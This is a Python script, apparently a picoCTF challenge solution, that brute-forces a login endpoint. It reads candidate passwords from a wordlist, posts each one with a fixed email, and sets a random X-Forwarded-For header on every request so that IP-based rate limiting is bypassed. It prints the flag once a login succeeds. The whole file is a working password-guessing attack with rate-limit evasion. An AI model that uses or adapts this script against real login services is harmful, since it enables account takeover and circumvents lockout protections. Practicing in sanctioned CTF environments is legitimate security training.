#!/usr/bin/env python3
import requests, random, json

TARGET = "http://amiable-citadel.picoctf.net:64600/login"
EMAIL = "ctf-player@picoctf.org"
PWFILE = "passwords.txt"

def rand_ip():
    return "{}.{}.{}.{}".format(random.randint(1,223), random.randint(0,255), random.randint(0,255), random.randint(0,255))

with open(PWFILE, 'r') as f:
    for line in f:
        pw = line.strip()
        if not pw:
            continue
        headers = {
            "X-Forwarded-For": rand_ip(),
            "User-Agent": "CTF-Checker",
            "Content-Type": "application/json"
        }
        payload = {"email": EMAIL, "password": pw}
        r = requests.post(TARGET, headers=headers, json=payload, timeout=10)
        try:
            j = r.json()
        except Exception:
            print("non-json response:", r.text)
            continue
        print("try", pw, "->", j)
        if j.get("success"):
            print("FOUND!", pw)
            print("FLAG:", j.get("flag"))
            break
